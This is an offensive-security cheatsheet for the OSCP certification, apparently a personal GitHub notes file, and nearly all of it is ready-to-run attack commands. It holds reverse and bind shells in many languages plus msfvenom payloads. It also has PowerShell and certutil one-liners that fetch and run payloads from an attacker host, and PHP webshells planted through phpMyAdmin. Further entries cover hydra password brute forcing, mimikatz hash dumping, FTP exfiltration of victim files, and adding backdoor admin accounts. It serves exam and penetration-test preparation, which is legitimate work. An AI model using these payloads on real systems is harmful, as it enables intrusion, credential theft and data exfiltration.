Linux version /proc/version
Find SSH keys in /home/[user]/.ssh/

Basic Linux PE - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/


Undelete files
grep –binary-files=text –context=100 'root' /dev/sdb > /tmp/root.txt

./windows-exploit-suggester.py --database 2019-03-17-mssb.xls --systeminfo /root/sandbox/sys_info_xp.txt
firefart:fib/tLwcEGsC2:0:0:pwned:/root:/bin/bash

set AUTORUNSCRIPT multi_console_command -r /root/autoruncommands.rc
windows/meterpreter/reverse_tcp_allports

powershell -version 2 -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23:8000/PowerUp.ps1'); Invoke-AllChecks"
powershell.exe -exec Bypass -C " (new-object System.Net.WebClient).Downloadfile('http://10.10.14.23:8000/Chimichurri.exe', 'C:\users\tolis\Chimichurri.exe')"

netcat URL encoded rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.23+1234+>/tmp/f
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

sql injection bypass user='*' and password='*'

sed -i 's/\r//' filename

proxytunnel -p 10.0.1.114:3128 -d 127.0.0.1:22 -a 4444
ssh john@127.0.0.1 -p 4444  "/bin/sh"

qemu-img convert -f vdi -O vmdk VulnOSv2.vdi VulnOSv2.vmdk

curl --head -X OPTIONS 192.168.2.4/test/
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Thu, 15 Jun 2017 16:32:35 GMT
Server: lighttpd/1.4.28

curl -v -X PUT -H "Expect: " 192.168.2.4/test/shell.php -d@shell.php

find SUID binaries
find / -perm -u=s -type f 2>/dev/null (SUID3ENUM)

SPARTA

echo $username = "alice" > startprocess.ps1
echo $password = "aliceishere" >> startprocess.ps1
echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> startprocess.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword >> startprocess.ps1
echo Start-Process "C:\Users\public\nc.exe" -ArgumentList "-e cmd.exe 192.168.119.213 1234"  -Credential $credential >> startprocess.ps1

    service_exec(conn, r'cmd /c net user bill pass /add')
    service_exec(conn, r'cmd /c net localgroup administrators bill /add') 

# OSCP Cheatsheet

The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend, restructure and update it from time to time, so let's see where this is going. 

**THIS IS WORK IN PROGRESS**

gcc -m32 -Wl,--hash-style=both -o exploit 18411.c 
Standalone GCC compiler (If machine does not have GCC)
chmod (file) 	- 	change file perms to be able to execute
socat TCP-LISTEN:51000,fork,reuseaddr OPENSSL:remotehost:51000,cafile=certificate.pem,verify=0

Mingw:
 i686-w64-mingw32- gcc(g++) exploit.c -o exploit -lws2_32

in case mingw32 does not support the code such as "__try" , compile in a windows vm:
Visual Studio Developer Command Line  (Developer Command Prompt for VS )
cl ex.cpp /link kernel32.lib shell32.lib user32.lib  

curl -s --data "<?system('ls -la');?>" "http://www.site/path/advanced_comment_system/admin.php?ACS_path=php://input%00"

## Disclaimer
This cheatsheet is definitely not "complete". I am sure i forgot to write down hundreds of essential commands, used most of them in the wrong way with unnessecary flags and you'll  probably soon ask yourself how i've even made it through the exam. Also you might think a certain tool used should be in another phase of the attack (e.g certain nmap vulnerabitly scripts should be in Exploitation). That's okay, imho the edges between different stages of a penetration test are very blurry. Feel free to issue a PR if you want to help to improve the list.
**Use for educational purposes only!**

 hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123

 sudo nmap -A -p80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-254
  cat nmap-scan_10.11.1.1-254
  cat nmap-scan_10.11.1.1-254 | grep 80
  cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap"
  cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print
$2}'
for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" |
awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done

sudo gobuster dir -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s '200,204,301,302,307,403,500' -e -k
for files
-x php,txt,cnf,conf

sudo gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -s '200,204,301,302,307,403,500' -k

nikto -host=http://10.11.1.71 -maxtime=30s
ls -lah /usr/share/nmap/scripts/*shellshock*

nc -nlvp 1234 (listen on 1234)

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe

msfvenom cheat sheet https://book.hacktricks.xyz/shells/shells/untitled

python -c 'import pty; pty.spawn("/bin/sh")'
***
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

meterpreter post/multi/recon/local_exploit_suggester 

use mimikatz
msv
mimikatz_command -f samdump::hashes

nmap -T4 -Pn -sV -F -sC -oN Bastard.nmap 10.11.1.50


basic webshell
/usr/share/webshells

active directory recon - https://book.hacktricks.xyz/windows/active-directory-methodology
smb enum check list https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

# Table Of Content
- [OSCP Cheatsheet](#oscp-cheatsheet)
  * [Disclaimer](#disclaimer)
- [Reconnaissance](#reconnaissance)
  * [Autorecon](#autorecon)
  * [Nmap](#nmap)
    + [Initial Fast TCP Scan](#initial-fast-tcp-scan)
    + [Full TCP Scan](#full-tcp-scan)
    + [Limited Full TCP Scan](#limited-full-tcp-scan)
    + [Top 100 UDP Scan](#top-100-udp-scan)
    + [Full Vulnerability scan](#full-vulnerability-scan)
    + [Vulners Vulnerability Script](#vulners-vulnerability-script)
    + [SMB Vulnerabitlity Scan](#smb-vulnerabitlity-scan)
  * [Gobuster](#gobuster)
    + [HTTP](#http)
      - [Fast Scan (Small List)](#fast-scan--small-list-)
      - [Fast Scan (Big List)](#fast-scan--big-list-)
      - [Slow Scan (Check File Extensions)](#slow-scan--check-file-extensions-)
    + [HTTPS](#https)
  * [SMBCLIENT](#smbclient)
    + [List Shares (As Guest)](#list-shares--as-guest-)
    + [Connect to A Share (As User John)](#connect-to-a-share--as-user-john-)
    + [Download All Files From A Directory Recursively](#download-all-files-from-a-directory-recursively)
    + [Alternate File Streams](#alternate-file-streams)
      - [List Streams](#list-streams)
      - [Download Stream By Name (:SECRET)](#download-stream-by-name---secret-)
  * [Enum4Linux](#enum4linux)
    + [Scan Host](#scan-host)
    + [Scan Host, Suppress Errors](#scan-host--suppress-errors)
  * [NFS](#nfs)
    + [Show mountable drives](#show-mountable-drives)
    + [Mount Drive](#mount-drive)
  * [WebApp Paths](#webapp-paths)
  * [SQLMAP](#sqlmap)
    + [Get Request](#get-request)
    + [Test All (Default Settings)](#test-all--default-settings-)
      - [Test All (Default Settings, High Stress)](#test-all--default-settings--high-stress-)
    + [Post Request (Capture with BURP)](#post-request--capture-with-burp-)
      - [Test All (Default Settings)](#test-all--default-settings--1)
      - [Test All (Default Settings, High Stress)](#test-all--default-settings--high-stress--1)
      - [Get A Reverse Shell (MySQL)](#get-a-reverse-shell--mysql-)
- [Brute Force](#brute-force)
  * [Hydra](#hydra)
    + [HTTP Basic Authentication](#http-basic-authentication)
    + [HTTP Get Request](#http-get-request)
    + [HTTP Post Request](#http-post-request)
    + [MYSQL](#mysql)
- [File Transfer](#file-transfer)
  * [Powershell](#powershell)
    + [As Cmd.exe Command](#as-cmdexe-command)
    + [Encode Command for Transfer](#encode-command-for-transfer)
  * [Certutil](#certutil)
    + [Download](#download)
    + [Download & Execute Python Command](#download---execute-python-command)
  * [SMB](#smb)
    + [Start Impacket SMB Server (With SMB2 Support)](#start-impacket-smb-server--with-smb2-support-)
    + [List Drives (Execute on Victim)](#list-drives--execute-on-victim-)
    + [Copy Files (Execute on Victim)](#copy-files--execute-on-victim-)
  * [PureFTP](#pureftp)
    + [Install](#install)
    + [Create setupftp.sh Execute The Script](#create-setupftpsh-execute-the-script)
    + [Get Service Ready](#get-service-ready)
      - [Reset Password](#reset-password)
      - [Commit Changes](#commit-changes)
      - [Restart Service](#restart-service)
    + [Create FTP Script (On Victim)](#create-ftp-script--on-victim-)
    + [Exectue Script (on Victim)](#exectue-script--on-victim-)
  * [Netcat](#netcat)
  * [Receiving Shell](#receiving-shell)
  * [Sending Shell](#sending-shell)
  * [TFTP](#tftp)
    + [Start TFTP Daemon (Folder /var/tftp)](#start-tftp-daemon--folder--var-tftp-)
    + [Transfer Files](#transfer-files)
  * [VBScript](#vbscript)
    + [Create wget.vbs File](#create-wgetvbs-file)
    + [Download Files](#download-files)
- [Shells](#shells)
  * [Upgrade Your Shell (TTY Shell)](#upgrade-your-shell--tty-shell-)
  * [Enable Tab-Completion](#enable-tab-completion)
  * [Catching Reverse Shells (Netcat)](#catching-reverse-shells--netcat-)
  * [Netcat](#netcat-1)
    + [Reverse Shell](#reverse-shell)
      - [Unix](#unix)
      - [Windows](#windows)
    + [Bind shell](#bind-shell)
      - [Unix](#unix-1)
      - [Windows](#windows-1)
  * [Bash](#bash)
    + [Reverse Shell](#reverse-shell-1)
  * [Python](#python)
    + [As Command (Reverse Shell)](#as-command--reverse-shell-)
    + [Python Code (Reverse Shell)](#python-code--reverse-shell-)
  * [PHP](#php)
    + [Kali Default PHP Reverse Shell](#kali-default-php-reverse-shell)
    + [Kali Default PHP CMD Shell](#kali-default-php-cmd-shell)
    + [PHP Reverse Shell](#php-reverse-shell)
    + [CMD Shell](#cmd-shell)
    + [WhiteWinterWolf Webshell](#whitewinterwolf-webshell)
  * [MSFVENOM](#msfvenom)
    + [Windows Binary (.exe)](#windows-binary--exe-)
      - [32 Bit (x86)](#32-bit--x86-)
      - [64 Bit (x64)](#64-bit--x64-)
    + [Linux Binary (.elf)](#linux-binary--elf-)
      - [32 Bit (x86)](#32-bit--x86--1)
      - [64 Bit (x64)](#64-bit--x64--1)
    + [Java Server Pages (.jsp)](#java-server-pages--jsp-)
    + [Active Sever Pages Extended (.aspx)](#active-sever-pages-extended--aspx-)
  * [Active Sever Pages Extended (.aspx)](#active-sever-pages-extended--aspx--1)
    + [Transfer A File (Certutil)](#transfer-a-file--certutil-)
    + [Execute a File](#execute-a-file)
  * [Jenkins / Groovy (Java)](#jenkins---groovy--java-)
    + [Linux Reverse Shell](#linux-reverse-shell)
    + [Windows Reverse Shell](#windows-reverse-shell)
  * [Perl](#perl)
    + [Reverse Shell](#reverse-shell-2)
  * [PhpmyAdmin](#phpmyadmin)

***

# Reconnaissance

## Autorecon
https://github.com/Tib3rius/AutoRecon

```bash
autorecon -vv 192.168.0.1
```

***

## Nmap

### Initial Fast TCP Scan

```bash
sudo nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1
```

### Full TCP Scan

```bash
sudo nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1
```

### Limited Full TCP Scan
*If the syn scan is taking very long to complete, the following command is an alternative (no service detection).*

```bash
nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.0.1
```

### Top 100 UDP Scan

```bash
sudo nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1
```

### Full Vulnerability scan

```bash
sudo nmap -v -sS  -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1
```

### Vulners Vulnerability Script

```bash
nmap -v -sS  -Pn --script nmap-vulners -oA full_vuln_scan_192.168.0.1 192.168.0.1
```

### SMB Vulnerabitlity Scan

```bash
sudo nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.0.1 192.168.0.1
```

***

## Gobuster

### HTTP
#### Fast Scan (Small List)

```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirb/big.txt -t 20
```
#### Fast Scan (Big List)

```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

#### Slow Scan (Check File Extensions)
```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20
```

### HTTPS

*Set the `--insecuressl` flag.*

***

## SMBCLIENT

To fix `NT_STATUS_CONNECTION_DISCONNECTED` errors in new Kali installations add `client min protocol = NT1` to your `\etc\samba\smb.conf` file.

### List Shares (As Guest)

```bash
smbclient -U guest -L 192.168.0.1
```

### Connect to A Share (As User John)

```bash
smbclient \\\\192.168.0.1\\Users -U c.smith
```

### Download All Files From A Directory Recursively

```bash
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'

example:
smbclient \\\\192.168.0.1\\Data -U John -c 'prompt OFF;recurse ON;cd '\Users\John\';lcd '/tmp/John';mget *'
```

### Alternate File Streams

#### List Streams

```bash
smbclient \\\\192.168.0.1\\Data -U John -c 'allinfo "\Users\John\file.txt"'
```

#### Download Stream By Name (:SECRET)
```bash
smbclient \\\\192.168.0.1\\Data -U John

get "\Users\John\file.txt:SECRET:$DATA"
```

***

## Enum4Linux

### Scan Host
```bash
enum4linux 192.168.0.1
```
### Scan Host, Suppress Errors
```bash
enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out 
```

***

## NFS

### Show mountable drives
```bash
showmount -e 192.168.0.1
```

### Mount Drive
```bash
mkdir mpt
mount -t nfs -o soft 192.168.0.1:/backup mpt/
```

***

## WebApp Paths

https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md

***

## SQLMAP

### Get Request

### Test All (Default Settings)
```bash
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch
```

#### Test All (Default Settings, High Stress)
```bash
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3
```

### Post Request (Capture with BURP)

#### Test All (Default Settings)

```bash
sqlmap --all -r post_request.txt --batch 
```
#### Test All (Default Settings, High Stress)
```bash
sqlmap --all -r post_request.txt --batch --level=5 --risk=3
```

#### Get A Reverse Shell (MySQL)
```bash
sqlmap -r post_request.txt --dbms "mysql" --os-shell
```

***

# Brute Force

## Hydra

### HTTP Basic Authentication

```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15
```

### HTTP Get Request

```bash
hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15
```

### HTTP Post Request
Check request in BURP to see Post parameters. **-l or -L has to be set, even if there is no user to login with!**. Use `https-post-form` instead of `http-post-form` for HTTPS sites.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```

### MYSQL
*Change MYDATABASENAME. Default databasename is mysql.*

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
```

***

# File Transfer

## Powershell

### As Cmd.exe Command

```bash
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')
```

### Encode Command for Transfer
*Very helpful for chars that need to be escaped otherwise.*

```bash
$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded
```

***

## Certutil

### Download
```bash
certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe
```

### Download & Execute Python Command
```bash
os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')
```

***

## SMB

### Start Impacket SMB Server (With SMB2 Support)

```bash
impacket-smbserver -smb2support server_name /var/www/html
```

### List Drives (Execute on Victim)
```bash
net view \\192.168.0.1
```

### Copy Files (Execute on Victim)
```bash
copy \\192.168.0.1\server_name\shell.exe shell.exe
```

***

## PureFTP

### Install
```bash
apt-get update && apt-get install pure-ftpd
```

### Create setupftp.sh Execute The Script

```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

```bash
./setupftp.sh
```

### Get Service Ready

#### Reset Password
```bash
pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd
```
 #### Commit Changes
 ```bash
pure-pw mkdb
 ```

 #### Restart Service
 ```bash
/etc/init.d/pure-ftpd restart 
 ```

 ### Create FTP Script (On Victim)
 ```bash
echo open 192.168.0.1>> ftp.txt
echo USER myftpuser>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo put secret_data.txt>> ftp.txt
echo bye >> ftp.txt
 ```

### Exectue Script (on Victim)

```bash
ftp -v -n -s:ftp.txt
```

***

## Netcat

## Receiving Shell
```bash
nc -l -p 1234 > out.file
```

## Sending Shell
```bash
nc -w 3 192.168.0.1 1234 < out.file
```

***

## TFTP

### Start TFTP Daemon (Folder /var/tftp)

```bash
atftpd --daemon --port 69 /var/tftp
```

### Transfer Files

```bash
tftp -i 192.168.0.1 GET whoami.exe
```

***

## VBScript 

### Create wget.vbs File 
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

### Download Files 

```bash
cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
```

***

# Shells

***

## Upgrade Your Shell (TTY Shell)
```bash
python -c 'import pty;pty.spawn("/bin/bash");' 
```

***

## Enable Tab-Completion
1. In your active shell press `bg` to send your nc session to background
2. Enter `stty raw -echo`
3. Enter `fg` to bring your nc session to foreground
4. Enter `export TERM=xterm-256color`

***

## Catching Reverse Shells (Netcat)
*rlwrap enables the usage of arrow keys in your shell.*
https://github.com/hanslub42/rlwrap
```bash
rlwrap nc -nlvp 4444
```

***

## Netcat

### Reverse Shell

#### Unix

*Victim:*
```bash
nc 192.168.0.1 4444 -e /bin/bash
```
*If `-e` is not allowed, try to find other versions of netcat*

```bash
/bin/nc
/usr/bin/ncat
/bin/netcat
/bin/nc.traditional
```

*Attacker:*
```bash
rlwrap nc -nlvp 4444
```
#### Windows
```bash
nc 192.168.0.1 4444 -e cmd.exe
```

### Bind shell

#### Unix

*Victim:*
```bash
nc -nlvp 4444 -e /bin/bash
```
*Attacker:*
```bash
nc 192.168.0.1 4444
```

#### Windows

*Victim:*
```bash
nc -nlvp 4444 -e cmd.exe
```
*Attacker:*
```bash
nc 192.168.0.1 4444
```

***

## Bash

### Reverse Shell

```bash
/bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1
```

***

## Python

### As Command (Reverse Shell)
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python Code (Reverse Shell)
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

***

## PHP

### Kali Default PHP Reverse Shell
```bash
cat /usr/share/webshells/php/php-reverse-shell.php
```

### Kali Default PHP CMD Shell
```bash
cat /usr/share/webshells/php/php-backdoor.php
```

### PHP Reverse Shell
*Version 1:*
```bash
<?php echo shell_exec("/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1");?>
```

*Version 2:*
```bash
<?php $sock=fsockopen("192.168.0.1", 4444);exec("/bin/sh -i <&3 >&3 2 >& 3");?>
```

*As Command:*
```bash
php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### CMD Shell
```bash
<?php echo system($_REQUEST["cmd"]); ?>
```
*Call the CMD shell:*
```bash
http://192.168.0.1/cmd_shell.php?cmd=whoami
```

### WhiteWinterWolf Webshell

https://github.com/WhiteWinterWolf/wwwolf-php-webshell

***

## MSFVENOM

### Windows Binary (.exe)
#### 32 Bit (x86)
*Reverse Shell:*
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

```

*Bind Shell:*
```bash
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

*Output in Hex, C Style, Exclude bad chars, Exitfunction thread:*
```bash
msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

#### 64 Bit (x64)
*Reverse Shell:*
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

*Bind Shell:*
```bash
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

*Meterpreter:*
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.0.1 lport=4321 -e x64/xor -i 5 -f exe -o /var/www/html/sc.exe
```

### Linux Binary (.elf)
#### 32 Bit (x86)
*Reverse Shell:*
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

*Bind Shell:*
```bash
msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf
```

#### 64 Bit (x64)
*Reverse Shell:*
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

*Bind Shell:*
```bash
msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf
```

### Java Server Pages (.jsp)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp
```

*As .war:*
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
```

### Active Sever Pages Extended (.aspx)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
```

***

## Active Sever Pages Extended (.aspx)

### Transfer A File (Certutil)
```bash
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

### Execute a File
```bash
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

***

## Jenkins / Groovy (Java)

### Linux Reverse Shell
```Java
String host="192.168.0.1";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Windows Reverse Shell
```Java
String host="192.168.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

***

## Perl

### Reverse Shell
```perl
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

***

## PhpmyAdmin

Write a CMD shell into a file with the right permissions. Issue the following select.
(Try different paths for different webservers)

*Windows:*
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

*Unix:*
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```

***

certutil -urlcache -split -f http://<your_kali_ip>/<file_name> <destination_path>

